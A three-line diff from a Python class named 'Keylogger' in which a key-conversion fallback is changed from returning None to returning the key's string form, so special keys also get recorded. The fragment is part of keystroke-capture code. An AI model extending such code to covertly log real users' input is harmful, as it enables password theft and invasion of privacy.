@@ -47,7 +47,7 @@ class Keylogger:
         if hasattr(key, 'char') and key.char is not None:
                 return key.char
 
-        return None
+        return str(key)
 
 
 
